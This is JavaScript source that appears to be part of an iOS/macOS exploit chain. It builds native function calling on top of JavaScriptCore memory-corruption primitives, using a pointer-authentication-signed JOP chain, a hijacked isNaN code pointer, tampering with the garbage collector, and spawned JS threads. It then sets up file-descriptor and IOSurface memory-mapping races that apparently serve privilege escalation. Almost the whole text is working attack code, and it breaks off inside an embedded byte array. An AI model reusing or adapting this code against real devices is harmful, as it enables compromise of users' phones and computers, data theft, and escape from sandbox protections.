(() => {
  fcall_init();
  let PAGE_SIZE = 0x4000n;
  let KERN_SUCCESS = 0n;
  let CALLOC = func_resolve("calloc");
  let MALLOC = func_resolve("malloc");
  let FREE = func_resolve("free");
  let MEMCPY = func_resolve("memcpy");
  let MEMSET = func_resolve("memset");
  let SLEEP = func_resolve("sleep");
  let USLEEP = func_resolve("usleep");
  let STRCMP = func_resolve("strcmp");
  let STRCPY = func_resolve("strcpy");
  let STRNCPY = func_resolve("strncpy");
  let SNPRINTF = func_resolve("snprintf");
  let PRINTF = func_resolve("printf");
  let ERRNO = func_resolve("errno");
  let CLOSE = func_resolve("close");
  let EXIT = func_resolve("exit");
  let GETCHAR = func_resolve("getchar");
  let GETPID = func_resolve("getpid");
  let SYSCALL = func_resolve("syscall");
  let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
  let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
  let MACH_ERROR_STRING = func_resolve("mach_error_string");
  let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
  let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");
  function assert(a, b = "N/A") {
    if (!a) {
      throw new Error(`assert failed: ${b}`);
    }
  }
  function ERROR(a) {
    throw new Error(a);
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function mach_task_self() {
    return 0x203n;
  }
  function calloc(...args) {
    return fcall(CALLOC, ...args);
  }
  function malloc(...args) {
    return fcall(MALLOC, ...args);
  }
  function free(...args) {
    return fcall(FREE, ...args);
  }
  function memcpy(...args) {
    return fcall(MEMCPY, ...args);
  }
  function memset(...args) {
    return fcall(MEMSET, ...args);
  }
  function sleep(...args) {
    return fcall(SLEEP, ...args);
  }
  function usleep(...args) {
    return fcall(USLEEP, ...args);
  }
  function strcmp(...args) {
    return fcall(STRCMP, ...args);
  }
  function strcpy(...args) {
    return fcall(STRCPY, ...args);
  }
  function strncpy(...args) {
    return fcall(STRNCPY, ...args);
  }
  function snprintf(...args) {
    return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function printf(...args) {
    return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function close(...args) {
    return fcall(CLOSE, ...args);
  }
  function exit(...args) {
    return fcall(EXIT, ...args);
  }
  function getchar(...args) {
    return fcall(GETCHAR, ...args);
  }
  function getpid(...args) {
    return fcall(GETPID, ...args);
  }
  function syscall(num, ...args) {
    return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
  }
  function mach_vm_allocate(...args) {
    return fcall(MACH_VM_ALLOCATE, ...args);
  }
  function mach_vm_deallocate(...args) {
    return fcall(MACH_VM_DEALLOCATE, ...args);
  }
  function mach_error_string(...args) {
    return fcall(MACH_ERROR_STRING, ...args);
  }
  function mach_port_allocate(...args) {
    return fcall(MACH_PORT_ALLOCATE, ...args);
  }
  let g_device_machine = 0n;
  function get_device_machine() {
    if (g_device_machine == 0n) {
      let utsname = calloc(256n, 5n);
      fcall(UNAME, utsname);
      g_device_machine = utsname + 256n * 4n;
    }
    return g_device_machine;
  }
  let OBJC_ALLOC = func_resolve("objc_alloc");
  let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
  let OBJC_GETCLASS = func_resolve("objc_getClass");
  let OBJC_MSGSEND = func_resolve("objc_msgSend");
  let SEL_REGISTERNAME = func_resolve("sel_registerName");
  let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
  let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
  let CFNUMBERCREATE = func_resolve("CFNumberCreate");
  let CFRELEASE = func_resolve("CFRelease");
  let CFSHOW = func_resolve("CFShow");
  let CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
  let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
  let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
  let kCFStringEncodingUTF8 = 0x08000100n;
  let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
  let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();
  function CFDictionaryCreateMutable(...args) {
    return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
  }
  function CFDictionarySetValue(...args) {
    return fcall(CFDICTIONARYSETVALUE, ...args);
  }
  function CFNumberCreate(...args) {
    return fcall(CFNUMBERCREATE, ...args);
  }
  function CFRelease(...args) {
    return fcall(CFRELEASE, ...args);
  }
  function CFShow(...args) {
    return fcall(CFSHOW, ...args);
  }
  function CFStringCreateCopy(...args) {
    return fcall(CFSTRINGCREATECOPY, ...args);
  }
  function CFStringCreateWithCString(...args) {
    return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
  }
  function objc_alloc(class_obj) {
    return fcall(OBJC_ALLOC, class_obj);
  }
  function objc_alloc_init(class_obj) {
    return fcall(OBJC_ALLOC_INIT, class_obj);
  }
  function objc_getClass(class_name) {
    return fcall(OBJC_GETCLASS, get_cstring(class_name));
  }
  function objc_msgSend(...args) {
    return fcall(OBJC_MSGSEND, ...args);
  }
  function sel_registerName(cstr) {
    return fcall(SEL_REGISTERNAME, cstr);
  }
  let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
  let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
  let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
  let selector_invoke = sel_registerName(get_cstring("invoke"));
  let selector_isFinished = sel_registerName(get_cstring("isFinished"));
  let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
  let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
  let selector_release = sel_registerName(get_cstring("release"));
  let selector_retainCount = sel_registerName(get_cstring("retainCount"));
  let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
  let selector_start = sel_registerName(get_cstring("start"));
  let invoke_class = objc_getClass("NSInvocation");
  let jsc_class = objc_getClass("JSContext");
  let nsthread_class = objc_getClass("NSThread");
  function create_cfstring(cstring) {
    return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
  }
  let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
  let cfstr_control_array = create_cfstring(get_cstring("control_array"));
  let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
  let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
  let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
  let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
  let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
  let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
  function create_cfstring_copy(cfstring) {
    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
  }
  function object_retainCount(obj) {
    return objc_msgSend(obj, selector_retainCount);
  }
  function object_release(obj) {
    return objc_msgSend(obj, selector_release);
  }
  function objectForKeyedSubscript(obj, cfstr_key) {
    return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
  }
  function evaluateScript(obj, jscript) {
    return objc_msgSend(obj, selector_evaluateScript, jscript);
  }
  function methodSignatureForSelector(obj, sel) {
    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
  }
  function invocationWithMethodSignature(obj, sig) {
    return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
  }
  function setArgument_atIndex(obj, arg, idx) {
    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
  }
  function initWithTarget_selector_object(obj, target, sel, object) {
    return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
  }
  function nsthread_start(obj) {
    return objc_msgSend(obj, selector_start);
  }
  function setup_fcall_jopchain() {
    let jsvm_fcall_buff = malloc(PAGE_SIZE);
    let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
    uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
    uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
    uwrite64(jsvm_fcall_buff + 0x10n, pacia(_CFObjectCopyProperty, 0n));
    uwrite64(jsvm_fcall_buff + 0x40n, pacia(jsvm_isNAN_fcall_gadget2, 0n));
    uwrite64(load_x1x3x8_args + 0x20n, load_x1x3x8_args + 0x40n);
    uwrite64(load_x1x3x8_args + 0x28n, jsvm_fcall_args - 0x10n);
    uwrite64(load_x1x3x8_args + 0x30n, pacia(0x41414141n, 0xC2D0n));
    uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
    return {
      "jsvm_fcall_buff": jsvm_fcall_buff,
      "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
      "jsvm_fcall_args": jsvm_fcall_args
    };
  }
  let evaluateScript_invocation = 0n;
  function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
    if (typeof js_script_nsstring === "string") {
      js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
    } else if (typeof js_script_nsstring === "object") {
      js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
    } else {
      js_script_nsstring = create_cfstring_copy(js_script_nsstring);
    }
    let jop_chain_info = setup_fcall_jopchain();
    let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
    let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
    let ctx = objc_alloc_init(jsc_class);
    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
    let isnan_func_addr = uread64(isnan_value + 0x8n);
    let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
    let isnan_code_ptr = isnan_executable_addr + 0x28n;
    evaluateScript(ctx, stage1_js);
    let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
    uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
    let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
    uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
    let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
    uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
    let signing_ctx = 0x4911n;
    let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
    uwrite64(isnan_code_ptr, signed_fcall_addr);
    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
    let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
    memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE);
    uwrite64(new_func_offsets_buffer + 3n * 0x8n, target_thread_arg);
    uwrite64(new_func_offsets_buffer + 5n * 0x8n, jsvm_fcall_buff);
    uwrite64(new_func_offsets_buffer + 6n * 0x8n, jsvm_fcall_pc);
    uwrite64(new_func_offsets_buffer + 7n * 0x8n, jsvm_fcall_args);
    if (evaluateScript_invocation == 0n) {
      let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
      evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
      setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
    }
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(ctx), 0n);
    setArgument_atIndex(evaluateScript_invocation, new_uint64_t(js_script_nsstring), 2n);
    let nsthread = objc_alloc(nsthread_class);
    initWithTarget_selector_object(nsthread, evaluateScript_invocation, selector_invoke, 0n);
    nsthread_start(nsthread);
    return {
      "thread_handle": nsthread,
      "js_ctx": ctx,
      "jop_chain_info": jop_chain_info,
      "js_script_nsstring": js_script_nsstring,
      "rw_array_buffer_bk": rw_array_buffer_bk,
      "control_array_buffer_bk": control_array_buffer_bk,
      "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
      "control_array_8_buffer_bk": control_array_8_buffer_bk
    };
  }
  function js_thread_join(js_thread) {
    let jop_chain_info = js_thread["jop_chain_info"];
    let js_ctx = js_thread["js_ctx"];
    let js_script_nsstring = js_thread["js_script_nsstring"];
    let nsthread = js_thread["thread_handle"];
    while (true) {
      let isFinished = objc_msgSend(nsthread, selector_isFinished);
      if (isFinished == 1n) {
        break;
      }
    }
    object_release(nsthread);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n, js_thread["control_array_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n, js_thread["rw_array_8_buffer_bk"]);
    uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n, js_thread["control_array_8_buffer_bk"]);
    let jsc_ref_count = object_retainCount(js_ctx);
    for (let i = 0n; i < jsc_ref_count; i++) {
      object_release(js_ctx);
    }
    CFRelease(js_script_nsstring);
    free(jop_chain_info["jsvm_fcall_buff"]);
  }
  let RTLD_DEFAULT = 0xFFFFFFFFFFFFFFFEn;
  let VM_FLAGS_ANYWHERE = 1n;
  let VM_FLAGS_FIXED = 0n;
  let VM_FLAGS_OVERWRITE = 0x4000n;
  let VM_FLAGS_RANDOM_ADDR = 8n;
  let VM_INHERIT_NONE = 2n;
  let VM_PROT_DEFAULT = 3n;
  let PROT_READ = 0x1n;
  let PROT_WRITE = 0x2n;
  let MAP_SHARED = 0x1n;
  let AF_INET6 = 30n;
  let SOCK_DGRAM = 2n;
  let IPPROTO_ICMPV6 = 58n;
  let ICMP6_FILTER = 18n;
  let SEEK_SET = 0n;
  let _NSGETEXECUTABLEPATH = func_resolve("_NSGetExecutablePath");
  let ACCESS = func_resolve("access");
  let CONFSTR = func_resolve("confstr");
  let FCNTL = func_resolve("fcntl");
  let FSYNC = func_resolve("fsync");
  let FILEPORT_MAKEFD = func_resolve("fileport_makefd");
  let FILEPORT_MAKEPORT = func_resolve("fileport_makeport");
  let FOPEN = func_resolve("fopen");
  let FCLOSE = func_resolve("fclose");
  let FWRITE = func_resolve("fwrite");
  let GETSOCKOPT = func_resolve("getsockopt");
  let LSEEK = func_resolve("lseek");
  let MACH_THREAD_SELF = func_resolve("mach_thread_self");
  let MEMMEM = func_resolve("memmem");
  let MEMSET_PATTERN8 = func_resolve("memset_pattern8");
  let OPEN = func_resolve("open");
  let PREADV = func_resolve("preadv");
  let PWRITEV = func_resolve("pwritev");
  let PWRITE = func_resolve("pwrite");
  let PREAD = func_resolve("pread");
  let READ = func_resolve("read");
  let SETSOCKOPT = func_resolve("setsockopt");
  let SOCKET = func_resolve("socket");
  let STRCAT = func_resolve("strcat");
  let STRSTR = func_resolve("strstr");
  let STRLEN = func_resolve("strlen");
  let STRNCMP = func_resolve("strncmp");
  let STRRCHR = func_resolve("strrchr");
  let PTHREAD_SELF = func_resolve("pthread_self");
  let PTHREAD_JOIN = func_resolve("pthread_join");
  let WRITE = func_resolve("write");
  let REMOVE = func_resolve("remove");
  let ARC4RANDOM = func_resolve("arc4random");
  let TASK_THREADS = func_resolve("task_threads");
  let THREAD_SUSPEND = func_resolve("thread_suspend");
  let MACH_MAKE_MEMORY_ENTRY_64 = func_resolve("mach_make_memory_entry_64");
  let MACH_PORT_DEALLOCATE = func_resolve("mach_port_deallocate");
  let MACH_VM_MAP = func_resolve("mach_vm_map");
  let MMAP = func_resolve("mmap");
  let MLOCK = func_resolve("mlock");
  let MUNLOCK = func_resolve("munlock");
  let UNAME = func_resolve("uname");
  let IOSURFACECREATE = func_resolve("IOSurfaceCreate");
  let IOSURFACEPREFETCHPAGES = func_resolve("IOSurfacePrefetchPages");
  let IOSURFACEGETBASEADDRESS = func_resolve("IOSurfaceGetBaseAddress");
  let kIOSurfaceAllocSize = uread64(func_resolve("kIOSurfaceAllocSize").noPAC());
  function DUMP(addr, sz) {}
  function js_malloc(sz) {
    buff = new Uint8Array(BigInt(sz).asInt32s).fill(0x00);
    return uread64(mem.addrof(buff) + 0x10n);
  }
  function mach_thread_self() {
    return fcall(MACH_THREAD_SELF);
  }
  function pthread_getspecific(key) {
    return fcall(PTHREAD_GETSPECIFIC, key);
  }
  function pthread_self() {
    return fcall(PTHREAD_SELF);
  }
  function pthread_join(thr, val) {
    return fcall(PTHREAD_JOIN, thr, val);
  }
  function _NSGetExecutablePath(executable_path, length_ptr) {
    return fcall(_NSGETEXECUTABLEPATH, executable_path, length_ptr);
  }
  function confstr(name, buf, len) {
    return fcall(CONFSTR, name, buf, len);
  }
  function strrchr(s, c) {
    return fcall(STRRCHR, s, c);
  }
  function strcat(s1, s2) {
    return fcall(STRCAT, s1, s2);
  }
  function strlen(s) {
    return fcall(STRLEN, s);
  }
  function strstr(s1, s2) {
    return fcall(STRSTR, s1, s2);
  }
  function strncmp(s1, s2, n) {
    return fcall(STRNCMP, s1, s2, n);
  }
  function socket(domain, type, protocol) {
    return fcall(SOCKET, domain, type, protocol);
  }
  function getsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(GETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function setsockopt(socket, level, option_name, option_value, option_len) {
    return fcall(SETSOCKOPT, socket, level, option_name, option_value, option_len);
  }
  function fileport_makeport(fd, port) {
    return fcall(FILEPORT_MAKEPORT, fd, port);
  }
  function fileport_makefd(port) {
    return fcall(FILEPORT_MAKEFD, port);
  }
  function memset_pattern8(buf, val, sz) {
    return fcall(MEMSET_PATTERN8, buf, val, sz);
  }
  function memmem(big, big_len, little, little_len) {
    return fcall(MEMMEM, big, big_len, little, little_len);
  }
  function access(path, mode) {
    return fcall(ACCESS, path, mode);
  }
  function open(path, mode) {
    return fcall(OPEN, path, mode);
  }
  function fopen(path, mode) {
    return fcall(FOPEN, path, mode);
  }
  function fclose(fd) {
    return fcall(FCLOSE, fd);
  }
  function fwrite(buf, sz, nitem, fd) {
    return fcall(FWRITE, buf, sz, nitem, fd);
  }
  function preadv(fildes, iov, iovcnt, offset) {
    return fcall(PREADV, fildes, iov, iovcnt, offset);
  }
  function pwritev(fildes, iov, iovcnt, offset) {
    return fcall(PWRITEV, fildes, iov, iovcnt, offset);
  }
  function pwrite(fildes, buff, size, offset) {
    return fcall(PWRITE, fildes, buff, size, offset);
  }
  function pread(fildes, buff, size, offset) {
    return fcall(PREAD, fildes, buff, size, offset);
  }
  function read(fd, buf, sz) {
    return fcall(READ, fd, buf, sz);
  }
  function write(fd, buf, sz) {
    return fcall(WRITE, fd, buf, sz);
  }
  function remove(path) {
    return fcall(REMOVE, path);
  }
  function arc4random() {
    return fcall(ARC4RANDOM);
  }
  function task_threads(task, thread_list_addr, thread_count_addr) {
    return fcall(TASK_THREADS, task, thread_list_addr, thread_count_addr);
  }
  function fcntl(fd, flag, value) {
    return fcall(FCNTL, fd, flag, 0n, 0n, 0n, 0n, 0n, 0n, value);
  }
  function lseek(fildes, offset, whence) {
    return fcall(LSEEK, fildes, offset, whence);
  }
  function fsync(fd) {
    return fcall(FSYNC, fd);
  }
  function CFStringCreateWithCString(allocator, cstring, encoding) {
    return fcall(CFSTRINGCREATEWITHCSTRING, allocator, cstring, encoding);
  }
  function CFStringCreateCopy(allocator, cfstring) {
    return fcall(CFSTRINGCREATECOPY, allocator, cfstring);
  }
  function CFDictionarySetValue(dict, key, value) {
    return fcall(CFDICTIONARYSETVALUE, dict, key, value);
  }
  function CFNumberCreate(allocator, theType, valuePtr) {
    return fcall(CFNUMBERCREATE, allocator, theType, valuePtr);
  }
  function IOSurfaceCreate(dict) {
    return fcall(IOSURFACECREATE, dict);
  }
  function IOSurfaceGetBaseAddress(surface) {
    return fcall(IOSURFACEGETBASEADDRESS, surface);
  }
  function IOSurfacePrefetchPages(surface) {
    return fcall(IOSURFACEPREFETCHPAGES, surface);
  }
  function CFRelease(obj) {
    return fcall(CFRELEASE, obj);
  }
  function CFShow(obj) {
    return fcall(CFSHOW, obj);
  }
  function mach_make_memory_entry_64(target_task, size, offset, permission, object_handle, parent_entry) {
    return fcall(MACH_MAKE_MEMORY_ENTRY_64, target_task, size, offset, permission, object_handle, parent_entry);
  }
  function mach_vm_map(target_task, address, size, mask, flags, object, offset, copy, cur_protection, max_protection, inheritance) {
    return fcall(MACH_VM_MAP, target_task, address, size, mask, flags, object, offset, copy, cur_protection | max_protection << 32n, inheritance);
  }
  function mmap(addr, len, prot, flags, fd, offset) {
    return fcall(MMAP, addr, len, prot, flags, fd, offset);
  }
  function mlock(address, size) {
    return fcall(MLOCK, address, size);
  }
  function munlock(address, size) {
    return fcall(MUNLOCK, address, size);
  }
  function mach_port_deallocate(task, name) {
    return fcall(MACH_PORT_DEALLOCATE, task, name);
  }
  function mach_task_self() {
    return 0x203n;
  }
  function new_uint64_t(val = 0n) {
    let buf = calloc(1n, 8n);
    uwrite64(buf, val);
    return buf;
  }
  function disable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 0n);
  }
  function enable_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let isSafeToCollect = heap + 0x241n;
    uwrite64(isSafeToCollect, 1n);
  }
  function disarm_gc() {
    let vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);
    let heap = vm + 0xc0n;
    let m_threadGroup = uread64(heap + 0x198n);
    let threads = uread64(m_threadGroup);
    uwrite64(threads + 0x20n, 0x0n);
  }
  disable_gc();
  disarm_gc();
  enable_gc();
  let executable_name = 0n;
  let read_file_path = 0n;
  let write_file_path = 0n;
  let target_file_size = PAGE_SIZE * 0x2n;
  let oob_offset = 0x100n;
  let oob_size = 0xf00n;
  let n_of_oob_pages = 2n;
  let pc_address = new_bigint();
  let pc_size = 0n;
  let pc_object = new_bigint();
  let free_target = 0n;
  let free_target_size = 0n;
  let write_fd = 0n;
  let read_fd = 0n;
  let random_marker = arc4random() << 32n | arc4random();
  let wired_page_marker = arc4random() << 32n | arc4random();
  let free_thread_start_ptr = 0n;
  let free_target_sync_ptr = 0n;
  let free_target_size_sync_ptr = 0n;
  let target_object_sync_ptr = 0n;
  let target_object_offset_sync_ptr = 0n;
  let go_sync_ptr = 0n;
  let race_sync_ptr = 0n;
  let free_thread_jsthread = 0n;
  let free_thread_arg = 0n;
  function init_target_file() {
    let _CS_DARWIN_USER_TEMP_DIR = 65537n;
    read_file_path = calloc(1n, 1024n);
    write_file_path = calloc(1n, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, read_file_path, 1024n);
    confstr(_CS_DARWIN_USER_TEMP_DIR, write_file_path, 1024n);
    strcat(read_file_path, get_cstring(`/${arc4random().hex()}`));
    strcat(write_file_path, get_cstring(`/${arc4random().hex()}`));
    create_target_file(read_file_path);
    create_target_file(write_file_path);
    read_fd = open(read_file_path, 0x2n);
    write_fd = open(write_file_path, 0x2n);
    LOG("[+] read_fd: " + read_fd.hex());
    LOG("[+] write_fd: " + write_fd.hex());
    remove(read_file_path);
    remove(write_file_path);
    fcntl(read_fd, 48n, 1n);
    fcntl(write_fd, 48n, 1n);
  }
  function pe_init() {
    init_target_file();
    if (executable_name == 0n) {
      let length = BigInt("0x1024");
      let executable_path = calloc(1n, length);
      _NSGetExecutablePath(executable_path, get_bigint_addr(length));
      executable_name = strrchr(executable_path, 0x2fn);
      if (executable_name != 0n) {
        executable_name = executable_name + 0x1n;
      } else {
        executable_name = executable_path;
      }
    }
    free_thread_arg = calloc(1n, PAGE_SIZE);
    LOG("[+] free_thread_arg: " + free_thread_arg.hex());
    free_thread_start_ptr = free_thread_arg;
    free_target_sync_ptr = free_thread_arg + 0x8n;
    free_target_size_sync_ptr = free_thread_arg + 0x10n;
    target_object_sync_ptr = free_thread_arg + 0x18n;
    target_object_offset_sync_ptr = free_thread_arg + 0x20n;
    go_sync_ptr = free_thread_arg + 0x28n;
    race_sync_ptr = free_thread_arg + 0x30n;
    let free_thread_js_data = new Uint8Array([102, 99, 97, 108, 108, 95, 105, 110, 105, 116, 40, 41, 59, 10, 108, 101, 116, 32, 80, 65, 71, 69, 95, 83, 73, 90, 69, 32, 32, 32, 32, 61, 32, 48, 120, 52, 48, 48, 48, 110, 59, 10, 108, 101, 116, 32, 75, 69, 82, 78, 95, 83, 85, 67, 67, 69, 83, 83, 32, 61, 32, 48, 110, 59, 10, 10, 108, 101, 116, 32, 67, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 77, 65, 76, 76, 79, 67, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 97, 108, 108, 111, 99, 34, 41, 59, 10, 108, 101, 116, 32, 70, 82, 69, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 102, 114, 101, 101, 34, 41, 59, 10, 10, 108, 101, 116, 32, 77, 69, 77, 67, 80, 89, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 77, 69, 77, 83, 69, 84, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 109, 101, 109, 115, 101, 116, 34, 41, 59, 10, 10, 108, 101, 116, 32, 83, 76, 69, 69, 80, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 85, 83, 76, 69, 69, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 117, 115, 108, 101, 101, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 77, 80, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 109, 112, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 67, 80, 89, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 84, 82, 78, 67, 80, 89, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 116, 114, 110, 99, 112, 121, 34, 41, 59, 10, 108, 101, 116, 32, 83, 78, 80, 82, 73, 78, 84, 70, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 110, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 108, 101, 116, 32, 80, 82, 73, 78, 84, 70, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 112, 114, 105, 110, 116, 102, 34, 41, 59, 10, 10, 108, 101, 116, 32, 69, 82, 82, 78, 79, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 114, 114, 110, 111, 34, 41, 59, 10, 108, 101, 116, 32, 67, 76, 79, 83, 69, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 99, 108, 111, 115, 101, 34, 41, 59, 10, 108, 101, 116, 32, 69, 88, 73, 84, 32, 32, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 101, 120, 105, 116, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 67, 72, 65, 82, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 99, 104, 97, 114, 34, 41, 59, 10, 108, 101, 116, 32, 71, 69, 84, 80, 73, 68, 32, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 103, 101, 116, 112, 105, 100, 34, 41, 59, 10, 108, 101, 116, 32, 83, 89, 83, 67, 65, 76, 76, 32, 61, 32, 102, 117, 110, 99, 95, 114, 101, 115, 111, 108, 118, 101, 40, 34, 115, 121, 115, 